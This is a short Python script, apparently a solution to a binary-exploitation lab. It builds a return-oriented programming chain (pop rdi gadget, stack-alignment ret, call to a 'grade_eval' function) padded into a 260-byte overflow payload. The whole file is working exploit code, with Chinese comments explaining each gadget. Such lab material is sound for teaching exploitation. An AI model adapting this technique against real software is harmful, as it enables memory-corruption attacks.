#!/usr/bin/env python3
import sys

P = lambda a: a.to_bytes(8, "little")
POP_RDI_RET = 0x4018A3   # pop %rdi; ret
RET_JUNK    = 0x4018B1   # ret(用于把 %rsp 对齐回 16 字节)
GRADE_EVAL  = 0x401677   # grade_eval(4) -> "Hope A will be your grade!"

# 搬运后: dst+0(saved rbp 处)吃掉第一个 qword, dst+8(返回地址)吃掉第二个。
chain  = P(0)            # [-> saved rbp] 占位,值无所谓
chain += P(POP_RDI_RET)  # [-> retaddr] 返回地址 -> pop %rdi; ret
chain += P(4)            #   %rdi = 4
chain += P(RET_JUNK)     #   %rsp 恢复 16B 对齐(printf 里 movaps 需要)
chain += P(GRADE_EVAL)   #   rip -> grade_eval; 打印成功, fflush 落盘
expr   = chain + b"B" * (128 - len(chain))
payload = expr + b"C" * 128 + (0xA0).to_bytes(4, "little")
assert len(payload) == 260 and b"\x0a" not in payload
sys.stdout.buffer.write(payload)
